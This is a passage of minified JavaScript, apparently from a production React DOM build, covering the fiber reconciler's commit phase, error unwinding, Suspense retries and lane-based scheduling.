me(n),null;if(i=(n.flags&128)!==0,a=s.rendering,a===null)if(i)ai(s,!1);else{if(te!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(a=ms(e),a!==null){for(n.flags|=128,ai(s,!1),i=a.updateQueue,i!==null&&(n.updateQueue=i,n.flags|=4),n.subtreeFlags=0,i=t,t=n.child;t!==null;)s=t,e=i,s.flags&=14680066,a=s.alternate,a===null?(s.childLanes=0,s.lanes=e,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=a.childLanes,s.lanes=a.lanes,s.child=a.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=a.memoizedProps,s.memoizedState=a.memoizedState,s.updateQueue=a.updateQueue,s.type=a.type,e=a.dependencies,s.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return V(X,X.current&1|2),n.child}e=e.sibling}s.tail!==null&&K()>Xt&&(n.flags|=128,i=!0,ai(s,!1),n.lanes=4194304)}else{if(!i)if(e=ms(a),e!==null){if(n.flags|=128,i=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),ai(s,!0),s.tail===null&&s.tailMode==="hidden"&&!a.alternate&&!G)return me(n),null}else 2*K()-s.renderingStartTime>Xt&&t!==1073741824&&(n.flags|=128,i=!0,ai(s,!1),n.lanes=4194304);s.isBackwards?(a.sibling=n.child,n.child=a):(t=s.last,t!==null?t.sibling=a:n.child=a,s.last=a)}return s.tail!==null?(n=s.tail,s.rendering=n,s.tail=n.sibling,s.renderingStartTime=K(),n.sibling=null,t=X.current,V(X,i?t&1|2:t&1),n):(me(n),null);case 22:case 23:return Yl(),i=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==i&&(n.flags|=8192),i&&n.mode&1?Le&1073741824&&(me(n),n.subtreeFlags&6&&(n.flags|=8192)):me(n),null;case 24:return null;case 25:return null}throw Error(P(156,n.tag))}function c2(e,n){switch(Il(n),n.tag){case 1:return Ee(n.type)&&as(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return zt(),H(Ae),H(he),Vl(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return Ul(n),null;case 13:if(H(X),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(P(340));_t()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return H(X),null;case 4:return zt(),null;case 10:return Bl(n.type._context),null;case 22:case 23:return Yl(),null;case 24:return null;default:return null}}var Er=!1,fe=!1,d2=typeof WeakSet=="function"?WeakSet:Set,D=null;function Rt(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(i){$(e,n,i)}else t.current=null}function qo(e,n,t){try{t()}catch(i){$(e,n,i)}}var wc=!1;function p2(e,n){if(mo=ts,e=dm(),ql(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var i=t.getSelection&&t.getSelection();if(i&&i.rangeCount!==0){t=i.anchorNode;var r=i.anchorOffset,s=i.focusNode;i=i.focusOffset;try{t.nodeType,s.nodeType}catch{t=null;break e}var a=0,o=-1,l=-1,u=0,c=0,d=e,p=null;n:for(;;){for(var g;d!==t||r!==0&&d.nodeType!==3||(o=a+r),d!==s||i!==0&&d.nodeType!==3||(l=a+i),d.nodeType===3&&(a+=d.nodeValue.length),(g=d.firstChild)!==null;)p=d,d=g;for(;;){if(d===e)break n;if(p===t&&++u===r&&(o=a),p===s&&++c===i&&(l=a),(g=d.nextSibling)!==null)break;d=p,p=d.parentNode}d=g}t=o===-1||l===-1?null:{start:o,end:l}}else t=null}t=t||{start:0,end:0}}else t=null;for(fo={focusedElem:e,selectionRange:t},ts=!1,D=n;D!==null;)if(n=D,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,D=e;else for(;D!==null;){n=D;try{var v=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(v!==null){var x=v.memoizedProps,b=v.memoizedState,h=n.stateNode,m=h.getSnapshotBeforeUpdate(n.elementType===n.type?x:Ge(n.type,x),b);h.__reactInternalSnapshotBeforeUpdate=m}break;case 3:var f=n.stateNode.containerInfo;f.nodeType===1?f.textContent="":f.nodeType===9&&f.documentElement&&f.removeChild(f.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(P(163))}}catch(y){$(n,n.return,y)}if(e=n.sibling,e!==null){e.return=n.return,D=e;break}D=n.return}return v=wc,wc=!1,v}function bi(e,n,t){var i=n.updateQueue;if(i=i!==null?i.lastEffect:null,i!==null){var r=i=i.next;do{if((r.tag&e)===e){var s=r.destroy;r.destroy=void 0,s!==void 0&&qo(n,t,s)}r=r.next}while(r!==i)}}function Vs(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var i=t.create;t.destroy=i()}t=t.next}while(t!==n)}}function No(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function lf(e){var n=e.alternate;n!==null&&(e.alternate=null,lf(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[sn],delete n[Fi],delete n[vo],delete n[Wv],delete n[$v])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function uf(e){return e.tag===5||e.tag===3||e.tag===4}function Bc(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||uf(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Io(e,n,t){var i=e.tag;if(i===5||i===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=ss));else if(i!==4&&(e=e.child,e!==null))for(Io(e,n,t),e=e.sibling;e!==null;)Io(e,n,t),e=e.sibling}function Mo(e,n,t){var i=e.tag;if(i===5||i===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(i!==4&&(e=e.child,e!==null))for(Mo(e,n,t),e=e.sibling;e!==null;)Mo(e,n,t),e=e.sibling}var ae=null,Xe=!1;function An(e,n,t){for(t=t.child;t!==null;)cf(e,n,t),t=t.sibling}function cf(e,n,t){if(an&&typeof an.onCommitFiberUnmount=="function")try{an.onCommitFiberUnmount(Ms,t)}catch{}switch(t.tag){case 5:fe||Rt(t,n);case 6:var i=ae,r=Xe;ae=null,An(e,n,t),ae=i,Xe=r,ae!==null&&(Xe?(e=ae,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):ae.removeChild(t.stateNode));break;case 18:ae!==null&&(Xe?(e=ae,t=t.stateNode,e.nodeType===8?ya(e.parentNode,t):e.nodeType===1&&ya(e,t),Ii(e)):ya(ae,t.stateNode));break;case 4:i=ae,r=Xe,ae=t.stateNode.containerInfo,Xe=!0,An(e,n,t),ae=i,Xe=r;break;case 0:case 11:case 14:case 15:if(!fe&&(i=t.updateQueue,i!==null&&(i=i.lastEffect,i!==null))){r=i=i.next;do{var s=r,a=s.destroy;s=s.tag,a!==void 0&&(s&2||s&4)&&qo(t,n,a),r=r.next}while(r!==i)}An(e,n,t);break;case 1:if(!fe&&(Rt(t,n),i=t.stateNode,typeof i.componentWillUnmount=="function"))try{i.props=t.memoizedProps,i.state=t.memoizedState,i.componentWillUnmount()}catch(o){$(t,n,o)}An(e,n,t);break;case 21:An(e,n,t);break;case 22:t.mode&1?(fe=(i=fe)||t.memoizedState!==null,An(e,n,t),fe=i):An(e,n,t);break;default:An(e,n,t)}}function Fc(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new d2),n.forEach(function(i){var r=b2.bind(null,e,i);t.has(i)||(t.add(i),i.then(r,r))})}}function _e(e,n){var t=n.deletions;if(t!==null)for(var i=0;i<t.length;i++){var r=t[i];try{var s=e,a=n,o=a;e:for(;o!==null;){switch(o.tag){case 5:ae=o.stateNode,Xe=!1;break e;case 3:ae=o.stateNode.containerInfo,Xe=!0;break e;case 4:ae=o.stateNode.containerInfo,Xe=!0;break e}o=o.return}if(ae===null)throw Error(P(160));cf(s,a,r),ae=null,Xe=!1;var l=r.alternate;l!==null&&(l.return=null),r.return=null}catch(u){$(r,n,u)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)df(n,e),n=n.sibling}function df(e,n){var t=e.alternate,i=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(_e(n,e),en(e),i&4){try{bi(3,e,e.return),Vs(3,e)}catch(x){$(e,e.return,x)}try{bi(5,e,e.return)}catch(x){$(e,e.return,x)}}break;case 1:_e(n,e),en(e),i&512&&t!==null&&Rt(t,t.return);break;case 5:if(_e(n,e),en(e),i&512&&t!==null&&Rt(t,t.return),e.flags&32){var r=e.stateNode;try{Ri(r,"")}catch(x){$(e,e.return,x)}}if(i&4&&(r=e.stateNode,r!=null)){var s=e.memoizedProps,a=t!==null?t.memoizedProps:s,o=e.type,l=e.updateQueue;if(e.updateQueue=null,l!==null)try{o==="input"&&s.type==="radio"&&s.name!=null&&Ip(r,s),to(o,a);var u=to(o,s);for(a=0;a<l.length;a+=2){var c=l[a],d=l[a+1];c==="style"?Fp(r,d):c==="dangerouslySetInnerHTML"?wp(r,d):c==="children"?Ri(r,d):vl(r,c,d,u)}switch(o){case"input":Ja(r,s);break;case"textarea":Mp(r,s);break;case"select":var p=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!s.multiple;var g=s.value;g!=null?Mt(r,!!s.multiple,g,!1):p!==!!s.multiple&&(s.defaultValue!=null?Mt(r,!!s.multiple,s.defaultValue,!0):Mt(r,!!s.multiple,s.multiple?[]:"",!1))}r[Fi]=s}catch(x){$(e,e.return,x)}}break;case 6:if(_e(n,e),en(e),i&4){if(e.stateNode===null)throw Error(P(162));r=e.stateNode,s=e.memoizedProps;try{r.nodeValue=s}catch(x){$(e,e.return,x)}}break;case 3:if(_e(n,e),en(e),i&4&&t!==null&&t.memoizedState.isDehydrated)try{Ii(n.containerInfo)}catch(x){$(e,e.return,x)}break;case 4:_e(n,e),en(e);break;case 13:_e(n,e),en(e),r=e.child,r.flags&8192&&(s=r.memoizedState!==null,r.stateNode.isHidden=s,!s||r.alternate!==null&&r.alternate.memoizedState!==null||(Kl=K())),i&4&&Fc(e);break;case 22:if(c=t!==null&&t.memoizedState!==null,e.mode&1?(fe=(u=fe)||c,_e(n,e),fe=u):_e(n,e),en(e),i&8192){if(u=e.memoizedState!==null,(e.stateNode.isHidden=u)&&!c&&e.mode&1)for(D=e,c=e.child;c!==null;){for(d=D=c;D!==null;){switch(p=D,g=p.child,p.tag){case 0:case 11:case 14:case 15:bi(4,p,p.return);break;case 1:Rt(p,p.return);var v=p.stateNode;if(typeof v.componentWillUnmount=="function"){i=p,t=p.return;try{n=i,v.props=n.memoizedProps,v.state=n.memoizedState,v.componentWillUnmount()}catch(x){$(i,t,x)}}break;case 5:Rt(p,p.return);break;case 22:if(p.memoizedState!==null){jc(d);continue}}g!==null?(g.return=p,D=g):jc(d)}c=c.sibling}e:for(c=null,d=e;;){if(d.tag===5){if(c===null){c=d;try{r=d.stateNode,u?(s=r.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(o=d.stateNode,l=d.memoizedProps.style,a=l!=null&&l.hasOwnProperty("display")?l.display:null,o.style.display=Bp("display",a))}catch(x){$(e,e.return,x)}}}else if(d.tag===6){if(c===null)try{d.stateNode.nodeValue=u?"":d.memoizedProps}catch(x){$(e,e.return,x)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===e)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===e)break e;for(;d.sibling===null;){if(d.return===null||d.return===e)break e;c===d&&(c=null),d=d.return}c===d&&(c=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:_e(n,e),en(e),i&4&&Fc(e);break;case 21:break;default:_e(n,e),en(e)}}function en(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(uf(t)){var i=t;break e}t=t.return}throw Error(P(160))}switch(i.tag){case 5:var r=i.stateNode;i.flags&32&&(Ri(r,""),i.flags&=-33);var s=Bc(e);Mo(e,s,r);break;case 3:case 4:var a=i.stateNode.containerInfo,o=Bc(e);Io(e,o,a);break;default:throw Error(P(161))}}catch(l){$(e,e.return,l)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function m2(e,n,t){D=e,pf(e)}function pf(e,n,t){for(var i=(e.mode&1)!==0;D!==null;){var r=D,s=r.child;if(r.tag===22&&i){var a=r.memoizedState!==null||Er;if(!a){var o=r.alternate,l=o!==null&&o.memoizedState!==null||fe;o=Er;var u=fe;if(Er=a,(fe=l)&&!u)for(D=r;D!==null;)a=D,l=a.child,a.tag===22&&a.memoizedState!==null?Uc(r):l!==null?(l.return=a,D=l):Uc(r);for(;s!==null;)D=s,pf(s),s=s.sibling;D=r,Er=o,fe=u}kc(e)}else r.subtreeFlags&8772&&s!==null?(s.return=r,D=s):kc(e)}}function kc(e){for(;D!==null;){var n=D;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:fe||Vs(5,n);break;case 1:var i=n.stateNode;if(n.flags&4&&!fe)if(t===null)i.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:Ge(n.type,t.memoizedProps);i.componentDidUpdate(r,t.memoizedState,i.__reactInternalSnapshotBeforeUpdate)}var s=n.updateQueue;s!==null&&Cc(n,s,i);break;case 3:var a=n.updateQueue;if(a!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}Cc(n,a,t)}break;case 5:var o=n.stateNode;if(t===null&&n.flags&4){t=o;var l=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&t.focus();break;case"img":l.src&&(t.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var u=n.alternate;if(u!==null){var c=u.memoizedState;if(c!==null){var d=c.dehydrated;d!==null&&Ii(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(P(163))}fe||n.flags&512&&No(n)}catch(p){$(n,n.return,p)}}if(n===e){D=null;break}if(t=n.sibling,t!==null){t.return=n.return,D=t;break}D=n.return}}function jc(e){for(;D!==null;){var n=D;if(n===e){D=null;break}var t=n.sibling;if(t!==null){t.return=n.return,D=t;break}D=n.return}}function Uc(e){for(;D!==null;){var n=D;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{Vs(4,n)}catch(l){$(n,t,l)}break;case 1:var i=n.stateNode;if(typeof i.componentDidMount=="function"){var r=n.return;try{i.componentDidMount()}catch(l){$(n,r,l)}}var s=n.return;try{No(n)}catch(l){$(n,s,l)}break;case 5:var a=n.return;try{No(n)}catch(l){$(n,a,l)}}}catch(l){$(n,n.return,l)}if(n===e){D=null;break}var o=n.sibling;if(o!==null){o.return=n.return,D=o;break}D=n.return}}var f2=Math.ceil,gs=bn.ReactCurrentDispatcher,Wl=bn.ReactCurrentOwner,ke=bn.ReactCurrentBatchConfig,B=0,se=null,Y=null,ce=0,Le=0,Dt=Hn(0),te=0,Hi=null,dt=0,_s=0,$l=0,Ci=null,be=null,Kl=0,Xt=1/0,cn=null,vs=!1,Oo=null,Bn=null,Pr=!1,qn=null,ys=0,Ai=0,wo=null,Ur=-1,Vr=0;function ye(){return B&6?K():Ur!==-1?Ur:Ur=K()}function Fn(e){return e.mode&1?B&2&&ce!==0?ce&-ce:Jv.transition!==null?(Vr===0&&(Vr=$p()),Vr):(e=F,e!==0||(e=window.event,e=e===void 0?16:tm(e.type)),e):1}function Ke(e,n,t,i){if(50<Ai)throw Ai=0,wo=null,Error(P(185));Yi(e,t,i),(!(B&2)||e!==se)&&(e===se&&(!(B&2)&&(_s|=t),te===4&&Rn(e,ce)),Pe(e,i),t===1&&B===0&&!(n.mode&1)&&(Xt=K()+500,ks&&zn()))}function Pe(e,n){var t=e.callbackNode;Jg(e,n);var i=ns(e,e===se?ce:0);if(i===0)t!==null&&$u(t),e.callbackNode=null,e.callbackPriority=0;else if(n=i&-i,e.callbackPriority!==n){if(t!=null&&$u(t),n===1)e.tag===0?Kv(Vc.bind(null,e)):bm(Vc.bind(null,e)),Xv(function(){!(B&6)&&zn()}),t=null;else{switch(Kp(i)){case 1:t=Cl;break;case 4:t=Qp;break;case 16:t=es;break;case 536870912:t=Wp;break;default:t=es}t=Sf(t,mf.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function mf(e,n){if(Ur=-1,Vr=0,B&6)throw Error(P(327));var t=e.callbackNode;if(kt()&&e.callbackNode!==t)return null;var i=ns(e,e===se?ce:0);if(i===0)return null;if(i&30||i&e.expiredLanes||n)n=xs(e,i);else{n=i;var r=B;B|=2;var s=hf();(se!==e||ce!==n)&&(cn=null,Xt=K()+500,it(e,n));do try{v2();break}catch(o){ff(e,o)}while(!0);wl(),gs.current=s,B=r,Y!==null?n=0:(se=null,ce=0,n=te)}if(n!==0){if(n===2&&(r=oo(e),r!==0&&(i=r,n=Bo(e,r))),n===1)throw t=Hi,it(e,0),Rn(e,i),Pe(e,K()),t;if(n===6)Rn(e,i);else{if(r=e.current.alternate,!(i&30)&&!h2(r)&&(n=xs(e,i),n===2&&(s=oo(e),s!==0&&(i=s,n=Bo(e,s))),n===1))throw t=Hi,it(e,0),Rn(e,i),Pe(e,K()),t;switch(e.finishedWork=r,e.finishedLanes=i,n){case 0:case 1:throw Error(P(345));case 2:Kn(e,be,cn);break;case 3:if(Rn(e,i),(i&130023424)===i&&(n=Kl+500-K(),10<n)){if(ns(e,0)!==0)break;if(r=e.suspendedLanes,(r&i)!==i){ye(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=go(Kn.bind(null,e,be,cn),n);break}Kn(e,be,cn);break;case 4:if(Rn(e,i),(i&4194240)===i)break;for(n=e.eventTimes,r=-1;0<i;){var a=31-$e(i);s=1<<a,a=n[a],a>r&&(r=a),i&=~s}if(i=r,i=K()-i,i=(120>i?120:480>i?480:1080>i?1080:1920>i?1920:3e3>i?3e3:4320>i?4320:1960*f2(i/1960))-i,10<i){e.timeoutHandle=go(Kn.bind(null,e,be,cn),i);break}Kn(e,be,cn);break;case 5:Kn(e,be,cn);break;default:throw Error(P(329))}}}return Pe(e,K()),e.callbackNode===t?mf.bind(null,e):null}function Bo(e,n){var t=Ci;return e.current.memoizedState.isDehydrated&&(it(e,n).flags|=256),e=xs(e,n),e!==2&&(n=be,be=t,n!==null&&Fo(n)),e}function Fo(e){be===null?be=e:be.push.apply(be,e)}function h2(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var i=0;i<t.length;i++){var r=t[i],s=r.getSnapshot;r=r.value;try{if(!Ye(s(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function Rn(e,n){for(n&=~$l,n&=~_s,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-$e(n),i=1<<t;e[t]=-1,n&=~i}}function Vc(e){if(B&6)throw Error(P(327));kt();var n=ns(e,0);if(!(n&1))return Pe(e,K()),null;var t=xs(e,n);if(e.tag!==0&&t===2){var i=oo(e);i!==0&&(n=i,t=Bo(e,i))}if(t===1)throw t=Hi,it(e,0),Rn(e,n),Pe(e,K()),t;if(t===6)throw Error(P(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Kn(e,be,cn),Pe(e,K()),null}function Jl(e,n){var t=B;B|=1;try{return e(n)}finally{B=t,B===0&&(Xt=K()+500,ks&&zn())}}function pt(e){qn!==null&&qn.tag===0&&!(B&6)&&kt();var n=B;B|=1;var t=ke.transition,i=F;try{if(ke.transition=null,F=1,e)return e()}finally{F=i,ke.transition=t,B=n,!(B&6)&&zn()}}function Yl(){Le=Dt.current,H(Dt)}function it(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Gv(t)),Y!==null)for(t=Y.return;t!==null;){var i=t;switch(Il(i),i.tag){case 1:i=i.type.childContextTypes,i!=null&&as();break;case 3:zt(),H(Ae),H(he),Vl();break;case 5:Ul(i);break;case 4:zt();break;case 13:H(X);break;case 19:H(X);break;case 10:Bl(i.type._context);break;case 22:case 23:Yl()}t=t.return}if(se=e,Y=e=kn(e.current,null),ce=Le=n,te=0,Hi=null,$l=_s=dt=0,be=Ci=null,Zn!==null){for(n=0;n<Zn.length;n++)if(t=Zn[n],i=t.interleaved,i!==null){t.interleaved=null;var r=i.next,s=t.pending;if(s!==null){var a=s.next;s.next=r,i.next=a}t.pending=i}Zn=null}return e}function ff(e,n){do{var t=Y;try{if(wl(),Fr.current=hs,fs){for(var i=Q.memoizedState;i!==null;){var r=i.queue;r!==null&&(r.pending=null),i=i.next}fs=!1}if(ct=0,re=ne=Q=null,Si=!1,Ui=0,Wl.current=null,t===null||t.return===null){te=1,Hi=n,Y=null;break}e:{var s=e,a=t.return,o=t,l=n;if(n=ce,o.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var u=l,c=o,d=c.tag;if(!(c.mode&1)&&(d===0||d===11||d===15)){var p=c.alternate;p?(c.updateQueue=p.updateQueue,c.memoizedState=p.memoizedState,c.lanes=p.lanes):(c.updateQueue=null,c.memoizedState=null)}var g=Rc(a);if(g!==null){g.flags&=-257,Dc(g,a,o,s,n),g.mode&1&&Lc(s,u,n),n=g,l=u;var v=n.updateQueue;if(v===null){var x=new Set;x.add(l),n.updateQueue=x}else v.add(l);break e}else{if(!(n&1)){Lc(s,u,n),Zl();break e}l=Error(P(426))}}else if(G&&o.mode&1){var b=Rc(a);if(b!==null){!(b.flags&65536)&&(b.flags|=256),Dc(b,a,o,s,n),Ml(Gt(l,o));break e}}s=l=Gt(l,o),te!==4&&(te=2),Ci===null?Ci=[s]:Ci.push(s),s=a;do{switch(s.tag){case 3:s.flags|=65536,n&=-n,s.lanes|=n;var h=Km(s,l,n);bc(s,h);break e;case 1:o=l;var m=s.type,f=s.stateNode;if(!(s.flags&128)&&(typeof m.getDerivedStateFromError=="function"||f!==null&&typeof f.componentDidCatch=="function"&&(Bn===null||!Bn.has(f)))){s.flags|=65536,n&=-n,s.lanes|=n;var y=Jm(s,o,n);bc(s,y);break e}}s=s.return}while(s!==null)}vf(t)}catch(A){n=A,Y===t&&t!==null&&(Y=t=t.return);continue}break}while(!0)}function hf(){var e=gs.current;return gs.current=hs,e===null?hs:e}function Zl(){(te===0||te===3||te===2)&&(te=4),se===null||!(dt&268435455)&&!(_s&268435455)||Rn(se,ce)}function xs(e,n){var t=B;B|=2;var i=hf();(se!==e||ce!==n)&&(cn=null,it(e,n));do try{g2();break}catch(r){ff(e,r)}while(!0);if(wl(),B=t,gs.current=i,Y!==null)throw Error(P(261));return se=null,ce=0,te}function g2(){for(;Y!==null;)gf(Y)}function v2(){for(;Y!==null&&!_g();)gf(Y)}function gf(e){var n=xf(e.alternate,e,Le);e.memoizedProps=e.pendingProps,n===null?vf(e):Y=n,Wl.current=null}function vf(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=c2(t,n),t!==null){t.flags&=32767,Y=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{te=6,Y=null;return}}else if(t=u2(t,n,Le),t!==null){Y=t;return}if(n=n.sibling,n!==null){Y=n;return}Y=n=e}while(n!==null);te===0&&(te=5)}function Kn(e,n,t){var i=F,r=ke.transition;try{ke.transition=null,F=1,y2(e,n,t,i)}finally{ke.transition=r,F=i}return null}function y2(e,n,t,i){do kt();while(qn!==null);if(B&6)throw Error(P(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(P(177));e.callbackNode=null,e.callbackPriority=0;var s=t.lanes|t.childLanes;if(Yg(e,s),e===se&&(Y=se=null,ce=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||Pr||(Pr=!0,Sf(es,function(){return kt(),null})),s=(t.flags&15990)!==0,t.subtreeFlags&15990||s){s=ke.transition,ke.transition=null;var a=F;F=1;var o=B;B|=4,Wl.current=null,p2(e,t),df(t,e),kv(fo),ts=!!mo,fo=mo=null,e.current=t,m2(t),Hg(),B=o,F=a,ke.transition=s}else e.current=t;if(Pr&&(Pr=!1,qn=e,ys=r),s=e.pendingLanes,s===0&&(Bn=null),Xg(t.stateNode),Pe(e,K()),n!==null)for(i=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],i(r.value,{componentStack:r.stack,digest:r.digest});if(vs)throw vs=!1,e=Oo,Oo=null,e;return ys&1&&e.tag!==0&&kt(),s=e.pendingLanes,s&1?e===wo?Ai++:(Ai=0,wo=e):Ai=0,zn(),null}function kt(){if(qn!==null){var e=Kp(ys),n=ke.transition,t=F;try{if(ke.transition=null,F=16>e?16:e,qn===null)var i=!1;else{if(e=qn,qn=null,ys=0,B&6)throw Error(P(331));var r=B;for(B|=4,D=e.current;D!==null;){var s=D,a=s.child;if(D.flags&16){var o=s.deletions;if(o!==null){for(var l=0;l<o.length;l++){var u=o[l];for(D=u;D!==null;){var c=D;switch(c.tag){case 0:case 11:case 15:bi(8,c,s)}var d=c.child;if(d!==null)d.return=c,D=d;else for(;D!==null;){c=D;var p=c.sibling,g=c.return;if(lf(c),c===u){D=null;break}if(p!==null){p.return=g,D=p;break}D=g}}}var v=s.alternate;if(v!==null){var x=v.child;if(x!==null){v.child=null;do{var b=x.sibling;x.sibling=null,x=b}while(x!==null)}}D=s}}if(s.subtreeFlags&2064&&a!==null)a.return=s,D=a;else e:for(;D!==null;){if(s=D,s.flags&2048)switch(s.tag){case 0:case 11:case 15:bi(9,s,s.return)}var h=s.sibling;if(h!==null){h.return=s.return,D=h;break e}D=s.return}}var m=e.current;for(D=m;D!==null;){a=D;var f=a.child;if(a.subtreeFlags&2064&&f!==null)f.return=a,D=f;else e:for(a=m;D!==null;){if(o=D,o.flags&2048)try{switch(o.tag){case 0:case 11:case 15:Vs(9,o)}}catch(A){$(o,o.return,A)}if(o===a){D=null;break e}var y=o.sibling;if(y!==null){y.return=o.return,D=y;break e}D=o.return}}if(B=r,zn(),an&&typeof an.onPostCommitFiberRoot=="function")try{an.onPostCommitFiberRoot(Ms,e)}catch{}i=!0}return i}finally{F=t,ke.transition=n}}return!1}function _c(e,n,t){n=Gt(t,n),n=Km(e,n,1),e=wn(e,n,1),n=ye(),e!==null&&(Yi(e,1,n),Pe(e,n))}function $(e,n,t){if(e.tag===3)_c(e,e,t);else for(;n!==null;){if(n.tag===3){_c(n,e,t);break}else if(n.tag===1){var i=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof i.componentDidCatch=="function"&&(Bn===null||!Bn.has(i))){e=Gt(t,e),e=Jm(n,e,1),n=wn(n,e,1),e=ye(),n!==null&&(Yi(n,1,e),Pe(n,e));break}}n=n.return}}function x2(e,n,t){var i=e.pingCache;i!==null&&i.delete(n),n=ye(),e.pingedLanes|=e.suspendedLanes&t,se===e&&(ce&t)===t&&(te===4||te===3&&(ce&130023424)===ce&&500>K()-Kl?it(e,0):$l|=t),Pe(e,n)}function yf(e,n){n===0&&(e.mode&1?(n=hr,hr<<=1,!(hr&130023424)&&(hr=4194304)):n=1);var t=ye();e=yn(e,n),e!==null&&(Yi(e,n,t),Pe(e,t))}function S2(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),yf(e,t)}function b2(e,n){var t=0;switch(e.tag){case 13:var i=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:i=e.stateNode;break;default:throw Error(P(314))}i!==null&&i.delete(n),yf(e,t)}var xf;xf=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||Ae.current)Ce=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return Ce=!1,l2(e,n,t);Ce=!!(e.flags&131072)}else Ce=!1,G&&n.flags&1048576&&Cm(n,us,n.index);switch(n.lanes=0,n.tag){case 2:var i=n.type;jr(e,n),e=n.pendingProps;var r=Vt(n,he.current);Ft(n,t),r=Hl(null,n,i,e,r,t);var s=zl();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,Ee(i)?(s=!0,os(n)):s=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,kl(n),r.updater=Us,n.stateNode=r,r._reactInternals=n,Ao(n,i,e,t),n=To(null,n,i,!0,s,t)):(n.tag=0,G&&s&&Nl(n),ge(null,n,r,t),n=n.child),n;case 16:i=n.elementType;e:{switch(jr(e,n),e=n.pendingProps,r=i._init,i=r(i._payload),n.type=i,r=n.tag=A2(i),e=Ge(i,e),r){case 0:n=Po(null,n,i,e,t);break e;case 1:n=Ic(null,n,i,e,t);break e;case 